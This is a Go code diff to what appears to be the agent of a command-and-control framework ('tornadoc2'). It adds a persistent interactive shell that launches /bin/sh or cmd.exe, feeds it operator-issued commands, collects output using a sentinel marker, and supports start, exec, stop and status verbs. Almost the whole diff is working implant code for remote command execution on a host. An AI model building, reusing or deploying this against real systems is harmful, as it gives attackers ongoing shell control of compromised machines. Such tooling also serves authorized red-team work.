@@ -19,12 +19,14 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"regexp"
 	"runtime"
 	"sort"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"tornadoc2/agent/native"
@@ -1555,6 +1557,255 @@ func ncDial(t Task, host string, port int, zeroIO bool,
 			fmt.Sprintf("open: %s (no data)\n", addr)))}
 	}
 	return Result{ID: t.ID, Output: encodeOutput(received)}
+}
+
+// ---------------------------------------------------------------------
+// Persistent interactive shell
+
+var (
+	shellMu       sync.Mutex
+	shellCmd      *exec.Cmd
+	shellStdin    io.WriteCloser
+	shellOutBuf   bytes.Buffer
+	shellReaderWG sync.WaitGroup
+	shellStartTS  time.Time
+)
+
+const shellSentinel = "__T2_SHELL_DONE__"
+const shellOutCap = 4 * 1024 * 1024
+
+func shellReaderLoop(r io.Reader) {
+	defer shellReaderWG.Done()
+	buf := make([]byte, 4096)
+	for {
+		n, err := r.Read(buf)
+		if n > 0 {
+			shellMu.Lock()
+			shellOutBuf.Write(buf[:n])
+			if shellOutBuf.Len() > shellOutCap {
+				data := shellOutBuf.Bytes()
+				keep := make([]byte, len(data)/2)
+				copy(keep, data[len(data)/2:])
+				shellOutBuf.Reset()
+				shellOutBuf.Write(keep)
+			}
+			shellMu.Unlock()
+		}
+		if err != nil {
+			return
+		}
+	}
+}
+
+// NativeShell dispatches on t.Args[0] for the four sub-verbs:
+// start, exec, stop, status.
+func NativeShell(t Task) Result {
+	if len(t.Args) < 1 {
+		return Result{ID: t.ID,
+			Error: "shell <start|exec|stop|status>"}
+	}
+	switch t.Args[0] {
+	case "start":
+		return shellStartVerb(t)
+	case "exec":
+		if len(t.Args) < 2 {
+			return Result{ID: t.ID,
+				Error: "shell exec requires a command"}
+		}
+		return shellExecVerb(t, strings.Join(t.Args[1:], " "))
+	case "stop":
+		return shellStopVerb(t)
+	case "status":
+		return shellStatusVerb(t)
+	default:
+		return Result{ID: t.ID,
+			Error: "unknown shell subcommand: " + t.Args[0]}
+	}
+}
+
+func shellStartVerb(t Task) Result {
+	shellMu.Lock()
+	defer shellMu.Unlock()
+
+	if shellCmd != nil && shellCmd.Process != nil &&
+		shellCmd.ProcessState == nil {
+		return Result{ID: t.ID, Output: encodeOutput([]byte(
+			fmt.Sprintf("shell already running (pid %d)\n",
+				shellCmd.Process.Pid)))}
+	}
+	shellCmd = nil
+	shellStdin = nil
+	shellOutBuf.Reset()
+
+	var name string
+	var argv []string
+	if runtime.GOOS == "windows" {
+		name = "cmd.exe"
+		argv = []string{"/Q"}
+	} else {
+		name = "/bin/sh"
+		argv = []string{"-s"}
+	}
+
+	cmd := exec.Command(name, argv...)
+	cmd.Env = sanitizedEnv()
+
+	stdin, err := cmd.StdinPipe()
+	if err != nil {
+		return Result{ID: t.ID,
+			Error: "shell start: stdin pipe: " + err.Error()}
+	}
+	stdout, err := cmd.StdoutPipe()
+	if err != nil {
+		stdin.Close()
+		return Result{ID: t.ID,
+			Error: "shell start: stdout pipe: " + err.Error()}
+	}
+	stderr, err := cmd.StderrPipe()
+	if err != nil {
+		stdin.Close()
+		stdout.Close()
+		return Result{ID: t.ID,
+			Error: "shell start: stderr pipe: " + err.Error()}
+	}
+
+	if err := cmd.Start(); err != nil {
+		stdin.Close()
+		stdout.Close()
+		stderr.Close()
+		return Result{ID: t.ID,
+			Error: "shell start: " + err.Error()}
+	}
+
+	shellCmd = cmd
+	shellStdin = stdin
+	shellOutBuf.Reset()
+	shellStartTS = time.Now()
+
+	shellReaderWG.Add(2)
+	go shellReaderLoop(stdout)
+	go shellReaderLoop(stderr)
+
+	return Result{ID: t.ID, Output: encodeOutput([]byte(
+		fmt.Sprintf("shell started: pid=%d %s\n",
+			cmd.Process.Pid, name)))}
+}
+
+func shellExecVerb(t Task, cmdLine string) Result {
+	shellMu.Lock()
+	if shellCmd == nil {
+		shellMu.Unlock()
+		return Result{ID: t.ID, Error: "shell: no running shell — " +
+			"use `shell start` first"}
+	}
+
+	shellOutBuf.Reset()
+
+	var writePayload, sentinelLine string
+	if runtime.GOOS == "windows" {
+		writePayload = cmdLine + "\r\n"
+		sentinelLine = "echo " + shellSentinel + "\r\n"
+	} else {
+		writePayload = cmdLine + "\n"
+		sentinelLine = "echo " + shellSentinel + "\n"
+	}
+
+	_, werr := io.WriteString(shellStdin,
+		writePayload+sentinelLine)
+	shellMu.Unlock()
+
+	if werr != nil {
+		return Result{ID: t.ID,
+			Error: "shell: write: " + werr.Error()}
+	}
+
+	deadline := time.Now().Add(120 * time.Second)
+	for time.Now().Before(deadline) {
+		shellMu.Lock()
+		s := shellOutBuf.String()
+		shellMu.Unlock()
+
+		if idx := strings.Index(s, shellSentinel); idx >= 0 {
+			out := strings.TrimRight(s[:idx], "\r\n")
+			after := s[idx+len(shellSentinel):]
+			after = strings.TrimLeft(after, "\r\n")
+
+			shellMu.Lock()
+			shellOutBuf.Reset()
+			shellOutBuf.WriteString(after)
+			shellMu.Unlock()
+
+			if out == "" {
+				out = "(no output)\n"
+			} else {
+				out += "\n"
+			}
+			return Result{ID: t.ID,
+				Output: encodeOutput([]byte(out))}
+		}
+		time.Sleep(50 * time.Millisecond)
+	}
+
+	return Result{ID: t.ID, Error: "shell: command timed out " +
+		"after 120s. Use `shell stop` to close it."}
+}
+
+func shellStopVerb(t Task) Result {
+	shellMu.Lock()
+	if shellCmd == nil {
+		shellMu.Unlock()
+		return Result{ID: t.ID, Output: encodeOutput([]byte(
+			"shell not running\n"))}
+	}
+	cmd := shellCmd
+	stdin := shellStdin
+
+	var exitLine string
+	if runtime.GOOS == "windows" {
+		exitLine = "exit\r\n"
+	} else {
+		exitLine = "exit\n"
+	}
+	if stdin != nil {
+		io.WriteString(stdin, exitLine)
+	}
+	shellCmd = nil
+	shellStdin = nil
+	shellOutBuf.Reset()
+	shellMu.Unlock()
+
+	done := make(chan struct{})
+	go func() {
+		cmd.Wait()
+		close(done)
+	}()
+	select {
+	case <-done:
+	case <-time.After(3 * time.Second):
+		if cmd.Process != nil {
+			cmd.Process.Kill()
+		}
+		<-done
+	}
+	shellReaderWG.Wait()
+
+	ran := time.Since(shellStartTS).Round(time.Second)
+	return Result{ID: t.ID, Output: encodeOutput([]byte(
+		fmt.Sprintf("shell stopped (ran %s)\n", ran)))}
+}
+
+func shellStatusVerb(t Task) Result {
+	shellMu.Lock()
+	defer shellMu.Unlock()
+	if shellCmd == nil || shellCmd.Process == nil ||
+		shellCmd.ProcessState != nil {
+		return Result{ID: t.ID, Output: encodeOutput([]byte(
+			"shell not running\n"))}
+	}
+	ran := time.Since(shellStartTS).Round(time.Second)
+	return Result{ID: t.ID, Output: encodeOutput([]byte(
+		fmt.Sprintf("shell running: pid=%d uptime=%s\n",
+			shellCmd.Process.Pid, ran)))}
 }
 
 type flagSpec struct {
